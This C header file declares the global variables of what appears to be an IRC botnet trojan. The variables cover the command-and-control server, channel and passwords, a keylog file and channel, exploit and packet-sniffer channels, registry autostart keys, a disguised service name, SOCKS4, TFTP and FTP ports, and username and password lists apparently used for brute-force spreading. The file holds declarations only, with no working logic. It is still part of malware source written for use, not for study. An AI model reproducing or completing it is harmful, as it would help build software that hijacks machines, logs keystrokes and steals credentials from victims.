extern char botid[];
extern char version[];
extern char password[];
extern char server[];
extern unsigned short port;
extern char serverpass[];
extern char channel[];
extern char chanpass[];
extern char server2[];
extern unsigned short port2;
extern char channel2[];
extern char chanpass2[];
extern char filename[];
extern char keylogfile[];
extern char valuename[];
extern char nickconst[]; 
extern char modeonconn[];
extern char chanmode[];
extern char exploitchan[];
extern char keylogchan[];
extern char psniffchan[];
extern char servicename[];
extern char servicedesc[];
extern char *authost[];
extern char *versionlist[];
extern char regkey1[];
extern char regkey2[];
extern char regkey3[];
extern char regkey4[];

extern unsigned short socks4port;
extern unsigned short tftpport;
extern unsigned short httpport;
extern unsigned short ftpport;
extern unsigned short rloginport;

extern BOOL topiccmd;
extern BOOL rndfilename;
extern BOOL AutoStart;

extern char prefix;

extern int maxrand;
extern int nicktype;
extern BOOL nickprefix;


extern THREAD threads[MAXTHREADS];


extern HANDLE ih;


extern ALIAS aliases[MAXALIASES];
extern int anum;


extern char *usernames[];
extern char *passwords[];


extern EXPLOIT exploit[];


extern int authsize;
extern int versionsize;


extern DWORD started;
extern BOOL success;
extern int current_version;


#ifdef DEBUG_LOGGING
extern char logfile[];
#endif

#ifdef PLAIN_CRYPT
extern char key[];
#endif
